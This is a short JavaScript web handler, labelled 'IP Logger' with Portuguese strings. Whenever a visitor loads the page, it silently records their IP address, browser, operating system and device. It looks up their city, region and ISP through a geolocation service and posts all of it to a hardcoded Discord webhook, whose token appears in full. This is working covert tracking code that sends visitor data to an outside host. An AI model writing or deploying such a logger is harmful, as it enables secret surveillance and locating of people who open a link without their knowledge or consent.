import UAParser from 'ua-parser-js';

export default async function handler(req, res) {
    const webhookUrl = "https://discord.com/api/webhooks/1377330816664731709/bl_oh9S8js6rhNgBNMmqSplQc7f__4dde322QGU-qSnq-VzQVvjQ_JwRjwDDQX2SDa6I";

    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;  
    const userAgent = req.headers["user-agent"] || "Desconhecido";  

    // Analisa o User-Agent
    const parser = new UAParser(userAgent);
    const browser = parser.getBrowser();
    const os = parser.getOS();
    const device = parser.getDevice();

    const geoRes = await fetch(`https://ipwho.is/${ip}`);  
    const geoData = await geoRes.json();  

    const country = geoData.country || "Desconhecido";  
    const countryCode = geoData.country_code || "Desconhecido";  
    const city = geoData.city || "Desconhecido";  
    const region = geoData.region || "Desconhecido";  
    const isp = geoData.connection?.isp || "Desconhecido";  
    const domain = geoData.connection?.domain || "Desconhecido";  

    const embed = {  
        embeds: [  
            {  
                title: "🖥 Novo usuário acessou o site",  
                color: 375295,  
                description: `
**Informações de IP**
> Endereço de IP: \`${ip}\`
País: ${country}
Código do País: ${countryCode}
Cidade: ${city}
Região: ${region}
Provedor: ${isp}
Domínio do Provedor: \`${domain}\`

**Informações do Navegador**
> User Agent: ${userAgent}

**Detalhes do Navegador**
> Navegador: ${browser.name || "Desconhecido"} ${browser.version || ""}
Sistema Operacional: ${os.name || "Desconhecido"} ${os.version || ""}
Dispositivo: ${device.vendor || ""} ${device.model || ""} (${device.type || "Desconhecido"})
`,
                footer: { text: "IP Logger" },
                timestamp: new Date().toISOString()
            }
        ]
    };

    await fetch(webhookUrl, {  
        method: 'POST',  
        headers: { 'Content-Type': 'application/json' },  
        body: JSON.stringify(embed)  
    });  

    res.status(200).end();
}
